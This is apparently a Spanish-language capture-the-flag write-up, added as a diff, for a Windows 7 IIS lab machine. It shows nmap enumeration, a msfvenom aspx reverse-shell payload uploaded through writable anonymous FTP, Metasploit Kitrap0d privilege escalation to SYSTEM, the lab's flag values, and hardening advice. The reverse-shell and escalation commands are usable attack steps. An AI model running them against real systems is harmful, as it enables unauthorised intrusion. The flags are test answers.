@@ -1,0 +1,64 @@
+Enumeración:
+
+Escaneo de Puertos (Nmap)
+
+nmap -sC -sV -oN nmap_scan.txt 10.129.34.226
+Resultados:
+
+Port 21 (FTP): Microsoft ftpd (Anonymous login allowed).
+
+Port 80 (HTTP): Microsoft IIS httpd 7.5.
+
+Inspección de FTP
+Al conectar de forma anónima, se confirmó que el directorio raíz del FTP era el mismo que el del servidor IIS (inetpub\wwwroot). Se verificó capacidad de escritura subiendo un archivo de prueba.
+
+Explotación (Foothold)
+Generación del Payload
+Dado que el servidor es IIS, se utilizó un payload .aspx.
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.204 LPORT=4444 -f aspx -o shell.aspx
+Transferencia y Ejecución
+Se subió shell.aspx vía FTP en modo binario.
+
+Se configuró el exploit/multi/handler en Metasploit.
+
+Se detonó el payload navegando a http://10.129.34.226/shell.aspx.
+
+Acceso: Obtenida sesión de Meterpreter como usuario iis apppool\web.
+
+Escalada de Privilegios (Privesc)
+Enumeración Local
+Bash
+
+meterpreter > sysinfo
+# OS: Windows 7 (6.1 Build 7600). Architecture: x86
+Se utilizó el módulo de sugerencias de exploits:
+
+use post/multi/recon/local_exploit_suggester
+set SESSION 1
+run
+Explotación del Kernel
+El sistema resultó vulnerable a MS10-015 (Kitrap0d).
+
+use exploit/windows/local/ms10_015_kitrap0d
+set SESSION 1
+set LHOST 10.10.14.204
+set LPORT 5555
+run
+Resultado: Sesión 2 abierta como NT AUTHORITY\SYSTEM.
+
+Flags
+User: 1185b49c9f6020c3730a7c73553e474a
+
+Ubicación: C:\Users\babis\Desktop\user.txt
+
+Root: ec38f193ba57cf89773b88967c09080d
+
+Ubicación: C:\Users\Administrator\Desktop\root.txt
+
+Recomendaciones de Seguridad (Hardening)
+Restricción de FTP: Deshabilitar el acceso anónimo y restringir los permisos de escritura a directorios fuera del alcance del servidor web.
+
+Actualización de Software: Migrar a una versión de Windows con soporte (Windows 7 está en fin de vida) y aplicar todos los parches de seguridad de Microsoft.
+
+Aislamiento de Aplicaciones: Configurar el Application Pool de IIS para que no tenga capacidad de ejecutar procesos que puedan comprometer el kernel.
